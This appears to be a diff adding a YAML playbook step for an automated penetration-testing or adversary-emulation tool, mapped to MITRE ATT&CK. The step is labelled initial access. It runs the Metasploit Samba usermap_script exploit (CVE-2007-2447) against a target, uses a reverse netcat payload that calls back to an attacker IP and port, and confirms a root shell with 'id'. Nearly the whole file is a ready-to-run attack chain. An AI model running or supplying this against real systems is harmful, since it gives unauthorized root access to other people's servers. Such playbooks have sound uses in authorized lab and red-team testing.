@@ -1,0 +1,42 @@
+# Phase 4: Initial Access - Samba usermap_script (CVE-2007-2447)
+#
+# Background: The "username map script" smb.conf option passes the username to
+# a shell script without sanitisation. By injecting shell metacharacters (`;`)
+# into the username, an attacker can execute arbitrary commands as root.
+#
+# Result:     Root shell session (no privilege escalation needed)
+# Variables required: $TARGET, $ATTACKER_IP, $LPORT
+# Variables set:      $SESSION_NAME, $LAST_MSF_SESSION
+# ATT&CK: T1190 (Exploit Public-Facing Application)
+
+commands:
+  - type: debug
+    cmd: "Attempting Samba usermap_script exploit against $TARGET ports 139/445..."
+
+  # TODO: Run the Samba exploit module.
+  - type: msf-module
+    cmd: exploit/multi/samba/usermap_script
+    creates_session: samba_shell
+    payload: cmd/unix/reverse_netcat
+    payload_options:
+      LHOST: $ATTACKER_IP
+      LPORT: $LPORT
+    options:
+      RHOSTS: $TARGET
+    metadata:
+      tactic: "TA0001"
+      technique: "T1190"
+      technique_name: "Exploit Public-Facing Application"
+
+  # Confirm the shell and verify privilege level (expect root)
+  - type: msf-session
+    session: samba_shell
+    cmd: id
+
+  # Store the session name for subsequent includes
+  - type: setvar
+    variable: SESSION_NAME
+    cmd: samba_shell
+
+  - type: debug
+    cmd: "Samba shell established. Running as: $RESULT_STDOUT"
